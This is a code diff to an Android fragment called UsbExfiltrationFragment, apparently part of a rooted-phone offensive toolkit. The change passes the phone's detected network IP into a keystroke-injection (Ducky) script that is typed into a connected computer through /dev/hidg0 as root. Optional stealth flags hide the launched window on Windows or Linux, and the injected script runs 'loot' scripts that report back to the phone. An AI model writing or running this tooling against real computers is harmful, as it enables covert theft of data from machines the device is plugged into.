@@ -70,6 +70,7 @@ public class UsbExfiltrationFragment extends Fragment {
     private String selectedLinuxScript = "loot.sh";
     private String selectedWindowsScript = "loot.ps1";
     private boolean hasAutoInjected = false;
+    private String detectedServerIp = "192.168.137.1"; // Store detected RNDIS IP for HID injection
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
     private final Handler logHandler = new Handler(Looper.getMainLooper());
     private Runnable logRunnable;
@@ -426,6 +427,9 @@ public class UsbExfiltrationFragment extends Fragment {
                 appendLog("[+] Detected RNDIS IP: " + rndisIp);
             }
 
+            // Store for HID injection
+            detectedServerIp = rndisIp;
+
             // Copy selected script to loot.sh or loot.ps1 and inject the IP
             String scriptDir = selectedTarget.equals("lnx") ? "scripts_linux" : "scripts_windows";
             String selectedScript = selectedTarget.equals("lnx") ? selectedLinuxScript : selectedWindowsScript;
@@ -497,7 +501,7 @@ public class UsbExfiltrationFragment extends Fragment {
              // Ensure permissions
              exe.RunAsRoot("chmod 666 /dev/hidg0");
 
-             // 0. Prepare Ducky Script (Replace Placeholder)
+             // 0. Prepare Ducky Script (Replace Placeholders)
              StringBuilder content = new StringBuilder();
              try {
                  BufferedReader reader = new BufferedReader(new FileReader(duckyScriptPath));
@@ -505,7 +509,8 @@ public class UsbExfiltrationFragment extends Fragment {
                  while ((line = reader.readLine()) != null) {
                      String processedLine = line.replace("{{LAUNCH_KEYS}}", finalLaunchKeys)
                              .replace("{{WIN_HIDDEN}}", isStealth ? "-W Hidden" : "")
-                             .replace("{{LNX_HIDE}}", isStealth ? " & exit" : "");
+                             .replace("{{LNX_HIDE}}", isStealth ? " & exit" : "")
+                             .replace("{{SERVER_IP}}", detectedServerIp);
                      content.append(processedLine).append("\n");
                  }
                  reader.close();
